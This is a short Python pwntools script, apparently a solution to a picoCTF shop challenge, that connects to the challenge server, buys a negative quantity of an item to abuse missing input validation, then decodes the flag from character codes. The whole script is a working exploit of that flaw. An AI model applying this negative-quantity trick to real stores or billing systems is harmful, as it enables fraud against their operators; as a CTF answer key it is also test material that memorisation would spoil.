from pwn import *

CONNECT = remote("mercury.picoctf.net", 34938)


def buy(option: int, number: int, con: remote = CONNECT):
    con.sendlineafter(b"Choose an option:", bytes(str(option), "utf-8"))
    con.sendlineafter(b"How many do you want to buy?",
                      bytes(str(number), "utf-8"))


def decodeFlag(con: remote = CONNECT):
    con.recvuntil(b"Flag is:  ")
    flag = con.recvline()[1:-2].decode().split(" ")
    con.close()
    flag = ''.join([chr(int(i)) for i in flag])
    print(flag)


buy(1, -4)
buy(2, 1)
decodeFlag()
